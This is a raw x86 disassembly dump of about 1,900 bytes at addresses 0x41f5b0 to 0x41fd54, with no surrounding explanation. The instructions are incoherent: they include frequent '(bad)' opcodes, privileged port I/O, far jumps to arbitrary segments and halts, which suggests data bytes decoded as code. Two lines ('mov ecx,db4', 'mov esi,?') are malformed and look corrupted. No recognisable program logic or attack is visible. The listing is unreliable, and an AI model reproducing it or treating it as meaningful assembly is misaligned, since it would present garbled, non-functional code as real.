  41f5b0:	out    dx,al
  41f5b1:	mov    cs,WORD PTR [ecx-0x22]
  41f5b4:	and    al,0x63
  41f5b6:	outs   dx,BYTE PTR ds:[esi]
  41f5b7:	jae    0x41f563
  41f5b9:	push   ds
  41f5ba:	xchg   ebp,eax
  41f5bb:	into   
  41f5bc:	mov    eax,0x51159cda
  41f5c1:	das    
  41f5c2:	xor    ebx,DWORD PTR [eax+0x74f76935]
  41f5c8:	lahf   
  41f5c9:	xlat   BYTE PTR ds:[ebx]
  41f5ca:	and    al,0xd3
  41f5cc:	mov    ah,0x87
  41f5ce:	cmp    DWORD PTR [ebx],edx
  41f5d0:	jmp    0xdae:0xdb0f4956
  41f5d7:	fld    DWORD PTR [ebx]
  41f5d9:	xchg   edx,eax
  41f5da:	pop    ebp
  41f5db:	(bad)  
  41f5dd:	out    0x70,eax
  41f5df:	ds inc ecx
  41f5e1:	scas   al,BYTE PTR es:[edi]
  41f5e2:	xchg   edi,eax
  41f5e3:	push   esp
  41f5e4:	imul   ebx,ebp,0x38
  41f5e7:	push   cs
  41f5e8:	mov    ds:0x5c585c18,al
  41f5ed:	and    BYTE PTR [edx+0x4],ch
  41f5f0:	jne    0x41f60f
  41f5f2:	push   edx
  41f5f3:	pop    es
  41f5f4:	std    
  41f5f5:	std    
  41f5f6:	ret    
  41f5f7:	or     eax,0x5082063
  41f5fc:	(bad)  [esi]
  41f5fe:	sub    al,BYTE PTR [ecx]
  41f600:	sbb    al,0xe3
  41f602:	sar    BYTE PTR [ecx+0xf],0xfc
  41f606:	call   0xbd49b1d6
  41f60b:	mov    al,0x3
  41f60d:	inc    ebx
  41f60e:	dec    eax
  41f60f:	in     eax,dx
  41f610:	pop    DWORD PTR [ebp-0x3ca4f4c6]
  41f616:	or     DWORD PTR [edi],ebp
  41f618:	out    dx,eax
  41f619:	pop    ebp
  41f61a:	and    ecx,DWORD PTR [eax+0xc]
  41f61d:	mov    esi,0x92941198
  41f622:	ret    0xeedc
  41f625:	jmp    0x1980:0x9affd01
  41f62c:	jne    0x41f64a
  41f62e:	aaa    
  41f62f:	imul   ebp,DWORD PTR [ecx+0x44],0xe593576
  41f636:	push   ebp
  41f637:	inc    ebp
  41f638:	in     al,0xda
  41f63a:	mov    esi,0x204520bc
  41f63f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f640:	(bad)  
  41f641:	cmp    al,BYTE PTR [edx-0x22]
  41f644:	jg     0x41f631
  41f646:	pop    edx
  41f647:	and    BYTE PTR [esi+0x7a31d519],al
  41f64d:	nop
  41f64e:	call   0x77fae5f3
  41f653:	test   al,0x32
  41f655:	(bad)  
  41f656:	cmc    
  41f657:	add    ecx,DWORD PTR [ecx+0x45]
  41f65a:	sub    al,0x42
  41f65c:	push   esp
  41f65d:	xchg   ebx,ecx
  41f65f:	xor    edx,esp
  41f661:	dec    edx
  41f662:	dec    eax
  41f663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f664:	in     al,0xae
  41f666:	stos   BYTE PTR es:[edi],al
  41f667:	pop    eax
  41f668:	mov    dl,0x6b
  41f66a:	dec    ecx
  41f66b:	mov    fs,WORD PTR [ecx-0xa]
  41f66e:	jns    0x41f69c
  41f670:	and    DWORD PTR [ecx-0x5eda1d7d],ecx
  41f676:	mov    ch,0x5f
  41f678:	outs   dx,DWORD PTR ds:[esi]
  41f679:	and    al,BYTE PTR [edx]
  41f67b:	shl    DWORD PTR [ecx-0x1e],0x8e
  41f67f:	frstorw [edi]
  41f682:	jge    0x41f672
  41f684:	aaa    
  41f685:	imul   ecx,DWORD PTR [ebp+0x43],0x2d0c5911
  41f68c:	sbb    bl,bh
  41f68e:	hlt    
  41f68f:	pop    ds
  41f690:	enter  0xa566,0x24
  41f694:	jmp    0xb194:0xb2cc9cd2
  41f69b:	fcomp  DWORD PTR [edi+0x14]
  41f69e:	sbb    DWORD PTR [ebx+0x79],ebp
  41f6a1:	call   0x4debe398
  41f6a6:	pop    es
  41f6a7:	lds    edi,FWORD PTR [ebx+edx*2-0x5e]
  41f6ab:	mov    dh,0x53
  41f6ad:	add    ebx,DWORD PTR [ecx+0x1d]
  41f6b0:	xchg   esi,eax
  41f6b1:	sub    al,0x4f
  41f6b3:	mov    BYTE PTR [edi],ch
  41f6b5:	retf   
  41f6b6:	mov    ecx,db4
  41f6b9:	add    ah,BYTE PTR [ebx]
  41f6bb:	mov    bl,0xc1
  41f6bd:	es jnp 0x41f675
  41f6c0:	mov    eax,ds:0xf8132f24
  41f6c5:	jne    0x41f6d3
  41f6c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6c8:	xchg   BYTE PTR [ecx+0x58],bh
  41f6cb:	xor    dh,cl
  41f6cd:	fs ja  0x41f723
  41f6d0:	xchg   esi,eax
  41f6d1:	mov    ds:0x96734596,al
  41f6d6:	xor    BYTE PTR [ebx],ah
  41f6d8:	(bad)  
  41f6d9:	pop    es
  41f6da:	nop
  41f6db:	pop    esp
  41f6dc:	test   al,0xe3
  41f6de:	and    dh,bh
  41f6e0:	adc    DWORD PTR [edi+0x771e221c],edi
  41f6e6:	push   0x66
  41f6e8:	sar    BYTE PTR [ebp+0x3b3ce1b3],1
  41f6ee:	enter  0xdb79,0xe
  41f6f2:	xchg   edx,eax
  41f6f3:	dec    ebx
  41f6f4:	xchg   edx,eax
  41f6f5:	imul   ebp,DWORD PTR [ecx],0xacb23716
  41f6fb:	xchg   BYTE PTR [ecx],ch
  41f6fd:	sti    
  41f6fe:	test   eax,0x7507369e
  41f703:	popa   
  41f704:	push   0x7253390e
  41f709:	lea    ebx,[esi+0x3f2d747a]
  41f70f:	and    ebx,DWORD PTR [eax]
  41f711:	dec    ebp
  41f712:	in     al,0x4d
  41f714:	loop   0x41f6dd
  41f716:	mov    eax,0x2e677f4e
  41f71b:	push   ebx
  41f71c:	inc    ebx
  41f71d:	jbe    0x41f76b
  41f71f:	or     BYTE PTR [ebp+ebx*2+0x6ea04360],bh
  41f726:	je     0x41f79c
  41f728:	lods   eax,DWORD PTR ds:[esi]
  41f729:	out    0x47,eax
  41f72b:	dec    edi
  41f72c:	out    0xc0,eax
  41f72e:	mov    eax,0x264557ec
  41f733:	sub    esi,ecx
  41f735:	mov    gs,ecx
  41f737:	call   0xfa4c:0x735f885
  41f73e:	pop    ecx
  41f73f:	stc    
  41f740:	sbb    al,0xe7
  41f742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f743:	push   ecx
  41f744:	mov    ebp,0xacb1bbc6
  41f749:	mov    al,0x79
  41f74b:	jmp    0x41f78c
  41f74d:	inc    eax
  41f74e:	call   0x4fe1:0x9a01c751
  41f755:	inc    ecx
  41f756:	jns    0x41f6f2
  41f758:	inc    ebp
  41f759:	inc    ebx
  41f75a:	lahf   
  41f75b:	pop    ds
  41f75c:	test   DWORD PTR [ecx+0x79],edx
  41f75f:	xchg   esp,eax
  41f760:	(bad)  
  41f761:	aam    0xe9
  41f763:	mov    ds:0x5bb2f35d,al
  41f768:	mov    al,0x37
  41f76a:	clc    
  41f76b:	in     eax,dx
  41f76c:	jecxz  0x41f728
  41f76e:	push   eax
  41f76f:	int3   
  41f770:	in     eax,0xa
  41f772:	jle    0x41f74d
  41f774:	add    eax,0xbace6dc5
  41f779:	inc    ebx
  41f77a:	daa    
  41f77b:	push   0x55cc49e5
  41f780:	adc    al,0xcc
  41f782:	lds    ebp,FWORD PTR [edx-0x30cfe5e6]
  41f788:	outs   dx,BYTE PTR ds:[esi]
  41f789:	arpl   WORD PTR [esi-0x6d],ax
  41f78c:	or     ecx,DWORD PTR [ebx-0x5bfd9605]
  41f792:	sar    edi,1
  41f794:	idiv   BYTE PTR [edi+ecx*8-0x242bd4fd]
  41f79b:	scas   al,BYTE PTR es:[edi]
  41f79c:	and    edx,DWORD PTR [ebx-0x523c548c]
  41f7a2:	sub    al,0xd6
  41f7a4:	ret    0xb9bb
  41f7a7:	les    ebp,FWORD PTR [edx+0x32de4d65]
  41f7ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7ae:	sbb    eax,DWORD PTR [ecx]
  41f7b0:	xchg   BYTE PTR [edx],bh
  41f7b2:	(bad)  
  41f7b3:	hlt    
  41f7b4:	rol    BYTE PTR [ebp-0x14de9469],1
  41f7ba:	ds jnp 0x41f7e5
  41f7bd:	and    eax,0x6a755a20
  41f7c2:	jmp    0xd626:0x498ea06
  41f7c9:	pop    ecx
  41f7ca:	cmp    eax,0x8077e277
  41f7cf:	mov    al,ds:0x36ba945e
  41f7d4:	xor    eax,0xc1fedf4
  41f7d9:	(bad)  
  41f7da:	int    0x39
  41f7dc:	cmp    ebp,ecx
  41f7de:	sub    al,0xd2
  41f7e0:	mov    ebx,0x1b06a53b
  41f7e5:	std    
  41f7e6:	fstp   DWORD PTR [edi-0x6795c6f7]
  41f7ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7ed:	adc    al,0x77
  41f7ef:	push   ss
  41f7f0:	jnp    0x41f855
  41f7f2:	or     al,0xf6
  41f7f4:	not    ebp
  41f7f6:	xor    BYTE PTR [esi],0x81
  41f7f9:	adc    DWORD PTR [ecx+0x7bc0bd98],ecx
  41f7ff:	sbb    al,0x23
  41f801:	arpl   WORD PTR [eax],sp
  41f803:	adc    DWORD PTR [edi],edi
  41f805:	test   DWORD PTR [eiz*2+0x2ad00f4d],0xc03a6de6
  41f810:	adc    eax,0x108f4445
  41f815:	inc    BYTE PTR [eax+0xd]
  41f818:	mov    cl,0x7d
  41f81a:	fimul  WORD PTR [ebx-0x9e5a25]
  41f820:	mov    bl,0xc6
  41f822:	push   es
  41f823:	icebp  
  41f824:	fwait
  41f825:	aaa    
  41f826:	fild   WORD PTR [esi+0x2be43b8d]
  41f82c:	mov    ebx,DWORD PTR [ebx+0x55]
  41f82f:	xchg   edx,eax
  41f830:	and    eax,DWORD PTR ds:0x4442d94b
  41f836:	test   al,0x2
  41f838:	cmc    
  41f839:	inc    esp
  41f83a:	sti    
  41f83b:	std    
  41f83c:	xchg   ebp,eax
  41f83d:	xchg   ebp,eax
  41f83e:	jl     0x41f7d1
  41f840:	repz jae 0x41f8ac
  41f843:	pop    ss
  41f844:	cdq    
  41f845:	sbb    ebp,esp
  41f847:	out    0x4e,al
  41f849:	int    0xc2
  41f84b:	(bad)  
  41f84c:	sbb    eax,0xaee9d34e
  41f851:	dec    eax
  41f852:	add    eax,0x84bf49b4
  41f857:	arpl   cx,bx
  41f859:	fbstp  TBYTE PTR [ebp-0x67beb24]
  41f85f:	push   0x4b
  41f861:	loope  0x41f7eb
  41f863:	adc    BYTE PTR [eax-0x6c],ah
  41f866:	mov    cl,0xca
  41f868:	jp     0x41f8db
  41f86a:	or     BYTE PTR [edx+ebx*8],cl
  41f86d:	nop
  41f86e:	mov    ch,cl
  41f870:	sub    BYTE PTR [edx],dh
  41f872:	mov    ds:0x63bdc2ea,eax
  41f877:	xor    BYTE PTR [ecx],dh
  41f879:	and    al,0xbc
  41f87b:	mov    ds:0x7be97b68,eax
  41f880:	test   DWORD PTR [ecx-0x20],ecx
  41f883:	in     eax,0x98
  41f885:	inc    ebp
  41f886:	push   0x39
  41f888:	mov    edi,0xa34435b0
  41f88d:	add    dh,al
  41f88f:	mov    ds:0x7ce767ac,eax
  41f894:	inc    dl
  41f896:	les    esi,FWORD PTR [ebp-0x6d0da11f]
  41f89c:	mov    esp,fs
  41f89e:	imul   ebx,DWORD PTR [edi],0x5e3682ac
  41f8a4:	stos   BYTE PTR es:[edi],al
  41f8a5:	in     eax,0x8a
  41f8a7:	retf   0x9350
  41f8aa:	xchg   esi,eax
  41f8ab:	mov    bh,0xbb
  41f8ad:	icebp  
  41f8ae:	mov    bl,0xb0
  41f8b0:	sub    ch,ah
  41f8b2:	adc    DWORD PTR [esi-0x768c4d3a],ecx
  41f8b8:	(bad)  [esi*1+0x2fede40e]
  41f8bf:	wbinvd 
  41f8c1:	hlt    
  41f8c2:	dec    ebp
  41f8c3:	fdiv   DWORD PTR [ecx]
  41f8c5:	cmp    DWORD PTR ss:[eax+0x33],edi
  41f8c9:	dec    esp
  41f8ca:	(bad)  
  41f8cb:	shr    BYTE PTR [edi+0x631750b2],1
  41f8d1:	(bad)  
  41f8d2:	xchg   ebx,eax
  41f8d3:	and    al,BYTE PTR [edi-0x20]
  41f8d6:	xchg   ebx,eax
  41f8d7:	push   ss
  41f8d8:	and    DWORD PTR [ebx+esi*1-0x419a50b3],eax
  41f8df:	loope  0x41f934
  41f8e1:	ss enter 0xd76c,0x42
  41f8e6:	xor    dl,BYTE PTR [ecx-0x6]
  41f8e9:	inc    edi
  41f8ea:	push   esi
  41f8eb:	xor    esp,DWORD PTR [esp+ecx*4+0x3c6ac45f]
  41f8f2:	pop    ebp
  41f8f3:	inc    ecx
  41f8f4:	or     BYTE PTR [ebx-0x38],al
  41f8f7:	mov    ebp,0xbe2f464d
  41f8fc:	mov    ss:0x746ba343,eax
  41f902:	sbb    al,0x2f
  41f904:	push   esp
  41f905:	and    BYTE PTR [edi],ch
  41f907:	fdivr  st(1),st
  41f909:	and    BYTE PTR [esi-0x1b],ah
  41f90c:	and    bh,ch
  41f90e:	jecxz  0x41f97b
  41f910:	or     al,0xf9
  41f912:	pop    ds
  41f913:	(bad)  
  41f914:	mov    eax,0xc1d42099
  41f919:	(bad)  
  41f91a:	(bad)  
  41f91b:	and    al,0x80
  41f91d:	and    eax,0x9ae5bf82
  41f922:	lods   eax,DWORD PTR ds:[esi]
  41f923:	mov    cs,WORD PTR [esi-0x73]
  41f926:	es jo  0x41f95b
  41f929:	retf   0xb07d
  41f92c:	addr16 mov esi,0x9b225d0b
  41f932:	or     eax,0x14e23a03
  41f937:	dec    ebp
  41f938:	stos   DWORD PTR es:[edi],eax
  41f939:	sbb    eax,0xd4a0f923
  41f93e:	in     al,dx
  41f93f:	std    
  41f940:	jo     0x41f90c
  41f942:	jmp    0x41f919
  41f944:	arpl   cx,dx
  41f946:	push   0x801a98df
  41f94b:	imul   esi,DWORD PTR [esi-0x2a45dbfa],0xd3b27672
  41f955:	sbb    BYTE PTR [esi],0x52
  41f958:	std    
  41f959:	retf   0x2c7a
  41f95c:	or     bl,BYTE PTR [eax+0x530ee765]
  41f962:	xor    DWORD PTR [eax-0xf],ecx
  41f965:	pop    esi
  41f966:	push   ds
  41f967:	push   ebp
  41f968:	sub    eax,0xb8894266
  41f96d:	add    BYTE PTR [esi+0x1f3413b9],al
  41f973:	in     al,dx
  41f974:	lds    eax,FWORD PTR [ebp-0x64cc91fd]
  41f97a:	and    eax,0xf9cd8d24
  41f97f:	test   al,0x98
  41f981:	in     al,dx
  41f982:	jle    0x41f982
  41f984:	mov    esi,?
  41f986:	sbb    al,0x4
  41f988:	inc    ecx
  41f989:	out    dx,al
  41f98a:	fadd   QWORD PTR [eax+ebp*8]
  41f98d:	fstp   DWORD PTR [ebp+edi*4+0x1ed93f7f]
  41f994:	push   esi
  41f995:	push   edi
  41f996:	xor    ch,ah
  41f998:	add    al,0xb4
  41f99a:	stos   DWORD PTR es:[edi],eax
  41f99b:	(bad)  
  41f99c:	and    esp,DWORD PTR [ecx+0x7f818f4]
  41f9a2:	lahf   
  41f9a3:	js     0x41f95f
  41f9a5:	mov    ecx,0x354901b8
  41f9aa:	retf   
  41f9ab:	in     eax,0xbf
  41f9ad:	jae    0x41f9af
  41f9af:	push   esp
  41f9b0:	push   ecx
  41f9b1:	jae    0x41f9e9
  41f9b3:	ins    BYTE PTR es:[edi],dx
  41f9b4:	sbb    eax,0x665eeb18
  41f9b9:	and    edx,DWORD PTR [edx-0x12e9e555]
  41f9bf:	je     0x41f9a3
  41f9c1:	es fwait
  41f9c3:	adc    DWORD PTR [esi],0xc13b73eb
  41f9c9:	test   eax,0xe7bbd4e2
  41f9ce:	repnz mov DWORD PTR [eax+0x276a385e],esp
  41f9d5:	stc    
  41f9d6:	sbb    dl,BYTE PTR [edx]
  41f9d8:	xor    dh,BYTE PTR fs:[ebx]
  41f9db:	pop    edi
  41f9dc:	loop   0x41fa3d
  41f9de:	mov    ds:0x6ce5a339,al
  41f9e3:	aaa    
  41f9e4:	ret    0xca58
  41f9e7:	cmc    
  41f9e8:	xlat   BYTE PTR ds:[ebx]
  41f9e9:	cmp    DWORD PTR [ebx-0x4d],eax
  41f9ec:	sbb    ebx,DWORD PTR [edi+0x63]
  41f9ef:	ret    0xa95c
  41f9f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9f3:	cli    
  41f9f4:	pop    esp
  41f9f5:	inc    edi
  41f9f6:	int    0x4e
  41f9f8:	clc    
  41f9f9:	lods   al,BYTE PTR ds:[esi]
  41f9fa:	mov    cl,0x8a
  41f9fc:	std    
  41f9fd:	(bad)  
  41f9ff:	mov    al,ds:0xcda889d6
  41fa04:	and    bl,ch
  41fa06:	mov    bl,0xbe
  41fa08:	xor    esp,esp
  41fa0a:	pop    es
  41fa0b:	jg     0x41fa3b
  41fa0d:	ds loop 0x41fa2a
  41fa10:	or     bh,BYTE PTR [edx+0x79]
  41fa13:	add    ch,dl
  41fa15:	mov    ds:0x4b2d11f6,eax
  41fa1a:	mov    ecx,DWORD PTR [esi+0x17]
  41fa1d:	aaa    
  41fa1e:	push   edx
  41fa1f:	jns    0x41fa19
  41fa21:	stos   DWORD PTR es:[edi],eax
  41fa22:	mov    dl,0x17
  41fa24:	mov    eax,ds:0x30c46e74
  41fa29:	repz jp 0x41fa80
  41fa2c:	vpaddusb ymm3,ymm0,ymm6
  41fa30:	jo     0x41fa4b
  41fa32:	xchg   DWORD PTR [ebx],ecx
  41fa34:	adc    bh,ch
  41fa36:	stos   DWORD PTR es:[edi],eax
  41fa37:	rcr    DWORD PTR [eax+0x7dc8c0a2],cl
  41fa3d:	imul   ebx,DWORD PTR [edx+0x59],0x1589d7f6
  41fa44:	mov    edi,0x24a8ee1a
  41fa49:	jl     0x41fa95
  41fa4b:	sbb    eax,0x17f7c343
  41fa50:	cmp    bh,BYTE PTR [esp+ecx*4]
  41fa53:	adc    edx,DWORD PTR [ecx+0x3c]
  41fa56:	aas    
  41fa57:	xchg   ebx,eax
  41fa58:	addr16 nop
  41fa5a:	mov    DWORD PTR [ebx+0x1d],ebp
  41fa5d:	or     eax,0x8342e573
  41fa62:	xor    edx,DWORD PTR [ecx]
  41fa64:	inc    eax
  41fa65:	inc    ebp
  41fa66:	addr16 mov esi,0x90d1f65f
  41fa6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa6d:	inc    edx
  41fa6e:	adc    edx,DWORD PTR [eax-0x5995afa5]
  41fa74:	aad    0x96
  41fa76:	inc    eax
  41fa77:	pop    esi
  41fa78:	mov    ds:0xe9a5ee4,al
  41fa7d:	and    al,0x44
  41fa7f:	xchg   edx,eax
  41fa80:	cmp    bl,BYTE PTR [edx-0x5a29f0a1]
  41fa86:	in     eax,dx
  41fa87:	push   ebx
  41fa88:	retf   
  41fa89:	and    DWORD PTR [ebp-0x53],eax
  41fa8c:	out    dx,eax
  41fa8d:	jno    0x41fa56
  41fa8f:	add    edx,DWORD PTR [eax]
  41fa91:	loop   0x41fa1b
  41fa93:	mov    ds:0xa0029bb,eax
  41fa98:	lods   al,BYTE PTR ds:[esi]
  41fa99:	test   al,0x67
  41fa9b:	fidiv  DWORD PTR [eax+0x3c]
  41fa9e:	jb     0x41fabd
  41faa0:	xchg   DWORD PTR [edx-0x38],edi
  41faa3:	mov    ch,0x90
  41faa5:	jbe    0x41fa7d
  41faa7:	arpl   WORD PTR [ebx+0x369753],dx
  41faad:	nop
  41faae:	ret    0x1e0d
  41fab1:	fistp  DWORD PTR [edx-0x1bfbc53e]
  41fab7:	outs   dx,DWORD PTR ds:[esi]
  41fab8:	(bad)  
  41fab9:	fidiv  DWORD PTR [ebx+0x2c7889c9]
  41fabf:	test   BYTE PTR [ecx],al
  41fac1:	and    BYTE PTR [ebp-0x68],bh
  41fac4:	sti    
  41fac5:	gs jg  0x41fb0b
  41fac8:	fbstp  TBYTE PTR [ecx+ebp*8-0x20]
  41facc:	ja     0x41fb1e
  41face:	les    esp,FWORD PTR [edx+0x3]
  41fad1:	push   edx
  41fad2:	lea    esp,[ebx+0x3713ef24]
  41fad8:	and    al,0xd4
  41fada:	call   0xc1091d3d
  41fadf:	out    dx,eax
  41fae0:	sub    eax,0x16e94ed5
  41fae5:	lods   al,BYTE PTR ds:[esi]
  41fae6:	push   eax
  41fae7:	pushw  0xfff5
  41faea:	mov    edx,0xcff94800
  41faef:	push   ebp
  41faf0:	retf   
  41faf1:	out    dx,al
  41faf2:	fmul   DWORD PTR [ebx+0x32d05b47]
  41faf8:	jmp    0xa600e072
  41fafd:	test   al,0x4f
  41faff:	inc    ebp
  41fb00:	pusha  
  41fb01:	and    eax,0x37d633c0
  41fb06:	call   0x88fd:0x824c9fa4
  41fb0d:	in     al,0x2d
  41fb0f:	gs out dx,al
  41fb11:	push   edx
  41fb12:	es clc 
  41fb14:	jbe    0x41fab1
  41fb16:	test   eax,0x35a25541
  41fb1b:	fst    st(0)
  41fb1d:	outs   dx,BYTE PTR ds:[esi]
  41fb1e:	cmc    
  41fb1f:	xlat   BYTE PTR ds:[ebx]
  41fb20:	cmp    al,0xa2
  41fb22:	jb     0x41fb0e
  41fb24:	adc    al,0xd
  41fb26:	fwait
  41fb27:	aas    
  41fb28:	div    al
  41fb2a:	stc    
  41fb2b:	xchg   ebp,eax
  41fb2c:	mov    edi,0xc293dd4f
  41fb31:	pop    ebx
  41fb32:	cdq    
  41fb33:	mov    esp,0x88ba4ae4
  41fb38:	and    eax,0x2399648f
  41fb3d:	pop    ss
  41fb3e:	retf   0x8916
  41fb41:	mov    esi,ss
  41fb43:	fsubp  st(6),st
  41fb45:	cmc    
  41fb46:	pop    eax
  41fb47:	xor    al,0xc9
  41fb49:	imul   ebp,eax,0xffffff9c
  41fb4c:	jp     0x41fb92
  41fb4e:	lods   al,BYTE PTR ds:[esi]
  41fb4f:	jo     0x41fbbb
  41fb51:	dec    esp
  41fb52:	mov    DWORD PTR [ebx*1+0x642925db],ebx
  41fb59:	push   0xffffffdc
  41fb5b:	pop    ds
  41fb5c:	rcl    dl,0x56
  41fb5f:	add    BYTE PTR [eax-0x780febc8],0x37
  41fb66:	js     0x41fba4
  41fb68:	imul   eax,DWORD PTR [ebx],0x21c415d6
  41fb6e:	inc    edx
  41fb6f:	clc    
  41fb70:	push   ebx
  41fb71:	loope  0x41fb19
  41fb73:	dec    eax
  41fb74:	push   esi
  41fb75:	jne    0x41fbc7
  41fb77:	test   BYTE PTR [edi-0x5cd403c7],ch
  41fb7d:	cmp    BYTE PTR ds:0xeb46d15f,dl
  41fb83:	mov    al,bh
  41fb85:	pusha  
  41fb86:	mov    esi,0xab6cee04
  41fb8b:	and    cl,BYTE PTR [eax-0x6c]
  41fb8e:	sahf   
  41fb8f:	xor    al,0x94
  41fb91:	adc    edx,eax
  41fb93:	mov    ah,ah
  41fb95:	hlt    
  41fb96:	jge    0x41fc07
  41fb98:	retf   0x617a
  41fb9b:	dec    esp
  41fb9c:	and    ebx,DWORD PTR [esi+0x33c88f8b]
  41fba2:	inc    ecx
  41fba3:	cdq    
  41fba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fba5:	jo     0x41fb8e
  41fba7:	neg    DWORD PTR [edx-0x2c]
  41fbaa:	ins    BYTE PTR es:[edi],dx
  41fbab:	mov    ecx,0xa62009e3
  41fbb0:	(bad)  
  41fbb1:	es inc eax
  41fbb3:	mov    ds:0x84ecf67a,eax
  41fbb8:	popa   
  41fbb9:	test   al,0x2b
  41fbbb:	fldcw  WORD PTR [esi+eax*8]
  41fbbe:	arpl   WORD PTR [edx],ax
  41fbc0:	inc    ecx
  41fbc1:	dec    esi
  41fbc2:	xchg   DWORD PTR [ebx+0x4c27c422],edx
  41fbc8:	mov    ebx,0x8b44be3d
  41fbcd:	cmp    eax,0x178a2b33
  41fbd2:	cmp    eax,0x1f080e94
  41fbd7:	retf   0xec6
  41fbda:	repz cmp BYTE PTR [eax+0x71],bl
  41fbde:	jmp    0xf745eb88
  41fbe3:	loop   0x41fbd7
  41fbe5:	xor    BYTE PTR [eax-0x12],dh
  41fbe8:	aam    0x23
  41fbea:	inc    eax
  41fbeb:	je     0x41fc3a
  41fbed:	call   0xf7c2:0x42b35867
  41fbf4:	sbb    DWORD PTR [ebp-0x55],esi
  41fbf7:	mov    eax,gs:0x991078f9
  41fbfd:	pop    ebx
  41fbfe:	sti    
  41fbff:	adc    DWORD PTR [edi+0x3a],0x4e
  41fc03:	xchg   esp,eax
  41fc04:	mov    ecx,0x3af5a60e
  41fc09:	add    eax,0x32f09087
  41fc0e:	hlt    
  41fc0f:	popf   
  41fc10:	stos   BYTE PTR es:[edi],al
  41fc11:	push   esi
  41fc12:	sub    BYTE PTR [edi-0x1e06be64],dl
  41fc18:	fs test eax,0x8508ccaf
  41fc1e:	inc    edi
  41fc1f:	out    dx,al
  41fc20:	jl     0x41fc7b
  41fc22:	mov    edx,0xd2f40251
  41fc27:	mov    cl,0x65
  41fc29:	cmc    
  41fc2a:	xchg   ebx,eax
  41fc2b:	and    eax,0x473cc073
  41fc30:	mov    ds:0x1059a475,eax
  41fc35:	jl     0x41fc5a
  41fc37:	int3   
  41fc38:	jo     0x41fc16
  41fc3a:	out    dx,eax
  41fc3b:	push   ebx
  41fc3c:	loope  0x41fc63
  41fc3e:	in     al,0x99
  41fc40:	addr16 je 0x41fc97
  41fc43:	fiadd  DWORD PTR fs:[ebx-0x47]
  41fc47:	hlt    
  41fc48:	shl    DWORD PTR [ebx],0x1e
  41fc4b:	sbb    DWORD PTR [eax+eiz*8],ecx
  41fc4e:	fwait
  41fc4f:	ret    0x609a
  41fc52:	xchg   ebx,esi
  41fc54:	or     DWORD PTR [edx+edi*2+0x25],esi
  41fc58:	aas    
  41fc59:	and    ebp,edi
  41fc5b:	cld    
  41fc5c:	cmp    edi,esi
  41fc5e:	loope  0x41fc57
  41fc60:	jg     0x41fc4b
  41fc62:	(bad)  
  41fc64:	test   eax,0x70253843
  41fc69:	add    BYTE PTR [esi],0x60
  41fc6c:	adc    DWORD PTR [edi],0x20
  41fc6f:	mov    al,BYTE PTR [ecx-0x1e]
  41fc72:	inc    eax
  41fc73:	xor    esi,DWORD PTR [edi]
  41fc75:	clc    
  41fc76:	fdivr  DWORD PTR [edi+ebp*4]
  41fc79:	fcom   DWORD PTR ds:0x698d7f6a
  41fc7f:	jne    0x41fc13
  41fc81:	inc    dx
  41fc83:	nop
  41fc84:	and    eax,DWORD PTR [esi-0x77949913]
  41fc8a:	sar    BYTE PTR [edi-0x7e95965],cl
  41fc90:	pop    ecx
  41fc91:	int3   
  41fc92:	sub    BYTE PTR [eax+0x2165ecf5],dl
  41fc98:	call   0x71429557
  41fc9d:	or     BYTE PTR [ebp+ebp*8-0x7d2e257a],ah
  41fca4:	jg     0x41fcd1
  41fca6:	adc    eax,0x5723a03d
  41fcab:	sti    
  41fcac:	neg    BYTE PTR [edx+ebp*4-0xa]
  41fcb0:	loop   0x41fcb3
  41fcb2:	inc    edi
  41fcb3:	sahf   
  41fcb4:	in     al,dx
  41fcb5:	push   ecx
  41fcb6:	hlt    
  41fcb7:	mov    ebx,0xaaf36547
  41fcbc:	fs jp  0x41fd32
  41fcbf:	xchg   ebx,eax
  41fcc0:	jge    0x41fd04
  41fcc2:	mov    cl,0x6f
  41fcc4:	(bad)  
  41fcc5:	push   es
  41fcc6:	int3   
  41fcc7:	mov    esi,0x448a772c
  41fccc:	cmp    BYTE PTR [esi-0x2b],ah
  41fccf:	cwde   
  41fcd0:	ja     0x41fd4e
  41fcd2:	fisub  WORD PTR [ecx+0x5d]
  41fcd5:	mov    ebp,0x19de4729
  41fcda:	mov    dh,bh
  41fcdc:	outs   dx,BYTE PTR ds:[esi]
  41fcdd:	or     DWORD PTR [ecx+esi*8-0x73],ebx
  41fce1:	ss pop ds
  41fce3:	adc    eax,0x7e28e40d
  41fce8:	cmp    DWORD PTR [ebp+0xe0fdc39],0xffffffdc
  41fcef:	inc    ebx
  41fcf0:	fisubr DWORD PTR [esi+eiz*1+0x98434be]
  41fcf7:	inc    edi
  41fcf8:	jecxz  0x41fd3a
  41fcfa:	das    
  41fcfb:	bound  ecx,QWORD PTR [ecx-0x793dc677]
  41fd01:	or     eax,0xeaf87c8e
  41fd06:	out    0xa8,eax
  41fd08:	fwait
  41fd09:	sti    
  41fd0a:	and    ebp,DWORD PTR [edx-0x3e]
  41fd0d:	fdecstp 
  41fd0f:	pop    ebx
  41fd10:	mov    DWORD PTR [eax],eax
  41fd12:	cmp    edi,edi
  41fd14:	cmc    
  41fd15:	mov    cl,0xd9
  41fd17:	dec    edi
  41fd18:	pop    edi
  41fd19:	or     bl,bl
  41fd1b:	call   0xdcae:0xe815648
  41fd22:	inc    ebp
  41fd23:	aas    
  41fd24:	jmp    0x41fd9e
  41fd26:	out    0x6b,eax
  41fd28:	test   DWORD PTR [edx+ebp*1-0x53],0x60eb973b
  41fd30:	fistp  WORD PTR [edi]
  41fd32:	and    eax,0x329db4e2
  41fd37:	sub    al,BYTE PTR [edi+0x60]
  41fd3a:	mov    dl,0xa4
  41fd3c:	push   edx
  41fd3d:	or     edx,ebx
  41fd3f:	jg     0x41fdbd
  41fd41:	xchg   edi,eax
  41fd42:	xor    ecx,0x15
  41fd45:	add    ch,bh
  41fd47:	add    DWORD PTR ds:0x76d85f5c,0x53fe5667
  41fd51:	leave  
  41fd52:	xchg   esp,eax
  41fd53:	pop    ebp
  41fd54:	xchg   BYTE PTR [edi],bh
